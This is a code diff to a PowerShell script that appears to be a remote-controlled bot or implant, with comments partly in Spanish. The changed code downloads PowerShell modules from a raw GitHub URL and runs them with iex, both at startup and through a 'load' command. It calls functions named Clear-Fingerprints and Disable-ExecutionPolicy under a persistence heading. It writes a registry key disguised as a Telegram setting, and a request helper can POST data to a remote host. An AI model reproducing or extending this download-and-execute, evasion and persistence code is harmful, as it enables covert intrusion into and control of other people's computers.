@@ -5,25 +5,43 @@ function loader{    # aqui empieza la funcion loader
         [Parameter(Mandatory)]
         [string] $path
     )
-    $ruta=$path;$ruta+=$file;$ruta+=".psm1" # monta la ruta completa
-    $ruta
-    $file=Get-RandomPath;$file+=".psm1"
-    (iwr $ruta -UseBasicParsing).Content > $file
-    ipmo $file; rm $file
+    $RawURL = $path + $file + ".ps1"
+    return New-Request -URL $RawURL
+}
+
+function New-Request{
+    param(
+        [string] $method="GET",
+        [Parameter(Mandatory)]
+        [string] $URL,
+        [string] $data
+    )
+    $wc = new-object system.net.WebClient
+    if ($proxy){
+        $prx = new-object System.Net.WebProxy
+        $prx.Address = $proxy
+        $wc.proxy = $prx
+    }
+
+    if ($method -eq "POST"){
+        $wc.UploadString($url, "POST", $data)
+    } else{
+        $webpage = $wc.DownloadData($url)
+        $data = [System.Text.Encoding]::ASCII.GetString($webpage)
+        return $data
+    }
 }
 
 $condition = $true
 $path = "https://raw.githubusercontent.com/josprou/BotAnsible/main/" # Dirección local donde cargar funciones y devolver resultados en caso de necesidad
-$ruta = $path;$ruta+="account_ansible";$ruta+=".psm1"
-(iwr $ruta -UseBasicParsing).Content | iex
+loader -path $path -file "account_ansible"
 $commandlist=@('account_ansible')
 $GLOBAL:joblist=@{}
-#if([string[]]$commandlist -notcontains "account_ansible"){loader -file "account_ansible" -path $path;$commandlist+="account_ansible"}
 #persistence
 Clear-Fingerprints
 Disable-ExecutionPolicy
 
-$RegKey = 'HKCU:\Software\MyTelegram'
+$RegKey = 'HKCU:\Software\classes\MyTelegram'
 New-MyTelegramConfiguration
 
 while($condition){
@@ -60,7 +78,7 @@ while($condition){
             }
             if($command[0] -eq "load"){
                 if($commandlist -notcontains $command[1]){
-                    loader -path $path -file $command[1]
+                    loader -path $path -file $command[1] | iex
                     $commandlist += $command[1]
                 }
                 if ($command[2])
